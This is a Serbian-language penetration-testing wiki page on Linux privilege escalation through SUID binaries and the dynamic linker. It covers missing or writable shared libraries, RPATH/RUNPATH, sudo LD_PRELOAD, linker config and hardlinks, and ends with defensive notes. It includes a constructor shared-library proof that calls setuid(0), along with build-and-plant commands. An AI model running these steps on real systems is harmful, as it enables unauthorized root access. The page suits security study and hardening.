# Злоупотреба SUID дељених библиотека и линкера

{{#include ../../banners/hacktricks-training.md}}

SUID бинарне датотеке се обично проверавају да би се открило директно извршавање команди, али прилагођени SUID програми могу бити рањиви и преко динамичког линкера. Заједничка тема је једноставна: привилеговани извршни фајл учитава код са путање или из конфигурације на коју корисник са нижим привилегијама може да утиче.<sup>[[1]](#references)</sup>

Ова страница се фокусира на опште обрасце техника: недостајуће библиотеке, директоријуме библиотека са дозволом за упис, `RPATH`/`RUNPATH`, `LD_PRELOAD` преко sudo-а, конфигурацију линкера и забуну око SUID hardlink-ова.

За заглавља ELF програма, динамички одељак и понашање учитавача на којима се заснивају ове провере, погледајте [Основне информације о ELF-у](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md).

## Брза претрага

Почните проналажењем необичних SUID фајлова и провером да ли су динамички повезани:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Za nepoznatu izvršnu datoteku koristite `readelf`: [`ldd` može da izvrši nepouzdani ELF interpreter](https://man7.org/linux/man-pages/man1/ldd.1.html). `readelf` prikazuje direktne zavisnosti, pa zasebno potvrdite koju putanju loader zaista bira.<sup>[[1]](#references)[[3]](#references)</sup>

Obratite pažnju na nestandardne lokacije, prilagođene putanje aplikacija, binarne datoteke čiji je vlasnik root, a nalaze se izvan direktorijuma kojima upravlja paketni menadžer, kao i na zavisnosti učitane iz direktorijuma u koje je moguće upisivati.<sup>[[1]](#references)</sup>

Korisne provere mogućnosti upisa:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

Neki prilagođeni SUID binarni fajlovi pokušavaju da učitaju shared object koji ne postoji. Ako se nedostajuća putanja nalazi unutar direktorijuma kojim upravlja napadač, binarni fajl može da učita kod koji je obezbedio napadač, sa privilegijama efektivnog korisnika.<sup>[[1]](#references)</sup>

Isto ograničenje važi za **prilagođeni binarni fajl dozvoljen preko sudo** kada poziva `dlopen()` sa apsolutnom `.so` putanjom unutar početnog ili konfiguracionog direktorijuma u koji pozivalac može da upisuje. Ovo naknadno učitavanje biblioteke možda neće biti prikazano u izlazu komande `ldd` niti u ELF `NEEDED` stavkama. Ograničeni pregled pomoću `strings` ili praćenje **neprivilegovanog** pokretanja mogu otkriti putanju kojoj se pristupa; lozinka aplikacije ili izbor stavke u meniju mogu uslovljavati to traženje. Pre nego što ovo tretirate kao eskalaciju privilegija, proverite tačno sudo pravilo, putanju i dozvole nadređenog direktorijuma, kao i to da li privilegovano pokretanje zaista dolazi do tog traženja. Nemojte pokretati sudo cilj samo da biste ga ispitali.

Pronađite neuspešna traženja biblioteka pomoću syscall filtera u `strace`-u:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

Ako binarna datoteka pretražuje putanju u koju može da se upisuje u potrazi za `libexample.so`, minimalna proof biblioteka može da koristi konstruktor. Tokom provere, dokaz uticaja treba da bude bezopasan:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Napravite ga pod tačno onim nazivom datoteke koji binarni fajl pokušava da učita:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

Uslov koji omogućava eksploataciju nije samo nedostajuća biblioteka. Napadač mora biti u mogućnosti da postavi kompatibilni shared object na putanju koju će privilegovani učitavač prihvatiti.<sup>[[1]](#references)</sup>

## Direktorijum biblioteke sa dozvolom upisa

Ponekad postoje sve zavisnosti, ali je moguće pisati u neki od direktorijuma koji se koriste za njihovo razrešavanje. To može omogućiti zamenu učitane biblioteke ili postavljanje biblioteke istog imena koja ima viši prioritet.<sup>[[1]](#references)</sup>

Ista provera važi za prilagođeni ELF **dozvoljen kroz sudo**, čak i kada ELF nema SUID bit i dozvoljeni RunAs nalog nije root. Uporedite njegove unose `DT_NEEDED` sa putanjom biblioteke koju će učitavač razrešiti; zatim proverite da li pozivalac može da upisuje u tu datoteku ili da je zameni preko direktorijuma roditelja u koji može da upisuje i kroz koji može da pretražuje. Potvrdite tačno sudo RunAs pravilo, simboličke veze i ACL-ove, pravila učitavača i da li ciljni proces učitava biblioteku kao nalog sa višim privilegijama. `.so` u koji može da se upisuje ili samo ime zavisnosti predstavljaju tek indiciju; pregledajte metapodatke bez pokretanja sudo komande.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Pregledajte putanje zavisnosti:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

Ako je direktorijum upisiv, proverite to u laboratorijskom okruženju pristupom koji ne ugrožava originalne fajlove. Zamena sistemskih biblioteka na aktivnom hostu može dovesti do toga da procesi koji se istovremeno pokreću koriste neusklađene verzije biblioteka.<sup>[[8]](#references)</sup>

### Upisive biblioteke unutar chroot-a

Sam chroot ne zatvara nasleđene deskriptore fajlova niti ograničava sav pristup sistemu fajlova. Ako sandbox ostavi deskriptor direktorijuma koji pokazuje izvan svog novog korena, a zatočeni proces može da pristupi tom deskriptoru (na primer, preko dostupnog unosa `/proc/<pid>/fd/`), putanje na hostu mogu ostati dostupne. Ovo je problem granice sistema fajlova; samo po sebi ne daje root privilegije.<sup>[[11]](#references)[[12]](#references)</sup>

Posebno proverite da li zatočeni korisnik može da upisuje u direktorijum biblioteka koji će koristiti **hostov root-SUID executable** kada se pokrene iz jail-a. Loader razrešava zavisnosti u kontekstu sistema fajлова процесса, па библиотека коју контролише napadač može da se izvrši sa efektivnim identitetом SUID programa. Potvrdite tačan executable, njegov SUID bit i pravila mount-a, cilj deskriptora i dozvole pristupa, putanju za pretragu biblioteka u jail-u, kao i to da program zaista može da pristupi host executable-u. File capability na sandbox launcher-u, upisiv jail ili hostov SUID binary sami po sebi samo ukazuju na mogući problem; ceo lanac zavisi od implementacije sandbox-a.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH and RUNPATH

`RPATH` i `RUNPATH` su unosi u dinamičkom odeljku koji govore loader-u gde da traži biblioteke. Opasni su u SUID programima kada upućuju na direktorijume u koje napadač može da upisuje.<sup>[[1]](#references)</sup>

Otkrivanje:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Primer rizičnog izlaza:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

Ako je `/opt/app/lib` upisiv i binarnoj datoteci je potrebna `libcustom.so`, napadač bi mogao tamo da postavi zlonamernu `libcustom.so`:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` i `RUNPATH` se ne ponašaju identično u svim detaljima razrešavanja, ali je za proveru privilege-escalation-a praktično pitanje isto: da li SUID binarni fajl traži biblioteku po imenu u direktorijumu u koji napadač može da upisuje?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH i SUID

Kod običnih programa, `LD_PRELOAD` i `LD_LIBRARY_PATH` mogu da nametnu ili utiču na učitavanje shared object-a. Kod SUID programa, dynamic loader obično ulazi u secure-execution režim i ignoriše opasne environment promenljive.<sup>[[1]](#references)</sup>

To znači da običan SUID binarni fajl obično nije ranjiv samo zato što korisnik može da podesi `LD_PRELOAD`:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

Uobičajeni izuzetak je sudo pravilo koje dozvoljava dodelu promenljive okruženja preko komandne linije za cilj, kao što je oznaka `SETENV` ili primenljiva opcija `setenv`. Ako je cilj dinamički povezan, a sudo prihvata `LD_PRELOAD=/path/to/library`, cilj može da učita kod kojim upravlja pozivalac. Proverite efektivno pravilo i identitet cilja. Samo dodavanje `LD_PRELOAD` u `env_keep` nije dovoljno na sistemima gde dinamički učitavač uklanja nasleđeni `LD_PRELOAD` pre nego što se pokrene SUID proces `sudo`; sudo obrađuje dodelu iz komandne linije nakon sopstvenog pokretanja.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

Nemojte mešati ove slučajeve; pravila za loader i sudo policy navedena iznad prave razliku između njih:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` u odnosu na običan SUID binary: obično blokiran tokom secure execution.
- `LD_PRELOAD` prihvaćen kao sudo command-line assignment za privilegovani, dynamically linked target: potencijalno exploitable.
- Nedostaje `.so` u putanji sa pravom upisa: exploitable kada SUID binary prirodno učitava tu putanju.
- `RPATH`/`RUNPATH` do direktorijuma sa pravom upisa: exploitable kada se potrebnom bibliotekom može upravljati.
- Pristup za upis u `/etc/ld.so.preload` ili linker config: sistemski i visokog uticaja.

## Konfiguracija linkera

`ld.so` koristi linker cache i `/etc/ld.so.preload`; `ldconfig` pravi taj cache na osnovu `/etc/ld.so.conf` i datoteka uključenih iz njega, najčešće iz `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Provere visokog prioriteta:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Konfiguracija linkera u koju je moguće upisivati obično je ozbiljniji problem od jedne ranjive SUID binarne datoteke, jer može da utiče na mnoge dinamički povezane procese. `/etc/ld.so.preload` je naročito opasan jer može da nametne učitavanje shared object-a u privilegovane procese.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinkovi mogu da učine da se isti SUID inode prikazuje pod više naziva.<sup>[[9]](#references)</sup> To može da posluži za sakrivanje privilegovanog pomoćnog programa, zbunjivanje pri čišćenju ili zaobilaženje naivne provere zasnovane na putanji.

Pronađite SUID datoteke sa više od jedne veze:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Pregledajte sve putanje ka istom inode-u:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

Zloupotreba nije u tome što hardlink menja dozvole. Zloupotreba je zabuna oko putanje: privilegovani inode može biti dostupan preko imena koje branioci ili skripte ne očekuju.<sup>[[9]](#references)</sup> Detaljniji opis rada sa inode-ovima i hardlinkovima potražite u odeljku [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Svedite broj SUID binarnih datoteka na minimum, proveravajte ih i, kad god je moguće, upravljajte njima putem paketa.
- Izbegavajte unose `RPATH`/`RUNPATH` koji upućuju na direktorijume u koje može da se piše ili kojima upravlja aplikacija.<sup>[[1]](#references)[[8]](#references)</sup>
- Direktorijumi sa bibliotekama treba da budu u vlasništvu root-a i da obični korisnici ne mogu da pišu u njih.<sup>[[8]](#references)</sup>
- Nemojte sačuvati `LD_PRELOAD`, `LD_LIBRARY_PATH` ili slične promenljive loader-a kroz sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Nadgledajte `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` i neočekivane SUID datoteke.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Proveravajte SUID datoteke sa hardlinkovima i istražite prilagođene SUID omotače izvan standardnih sistemskih putanja.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux stranica priručnika](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU binarni alati)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux stranica priručnika](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux stranica priručnika](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Uobičajeni atributi (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Ojačavanje dinamičkog linker-a (GNU C biblioteka)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hardlinkovi (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU binarni alati)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — Linux stranica priručnika](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — Linux stranica priručnika](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
